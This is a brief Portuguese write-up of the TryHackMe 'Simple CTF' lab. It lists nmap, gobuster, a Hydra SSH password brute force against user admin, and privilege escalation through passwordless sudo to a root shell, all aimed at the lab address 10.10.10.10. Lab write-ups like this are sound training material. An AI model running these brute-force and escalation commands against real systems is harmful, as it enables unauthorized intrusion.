# 🛠️ Write-up: TryHackMe - Simple CTF

## 🔎 Objetivo
Esta sala introduz conceitos básicos de enumeração, exploração e escalada de privilégios em ambientes Linux.

## 🧰 Ferramentas utilizadas
- nmap
- gobuster
- Hydra
- John the Ripper

## 🗂️ Etapas

### 1. Enumeração
```bash
nmap -sC -sV -oN initial-scan.txt 10.10.10.10
```
Identificamos um serviço SSH e um servidor Apache na porta 80.

### 2. Descoberta de diretórios
```bash
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### 3. Brute force de login
```bash
hydra -l admin -P rockyou.txt ssh://10.10.10.10
```

### 4. Escalada de privilégios
Usuário explorável com sudo sem senha:
```bash
sudo -l
sudo /bin/bash
```

## 📝 Conclusão
Sala introdutória que cobre o básico de enumeração e escalada simples com sudo.
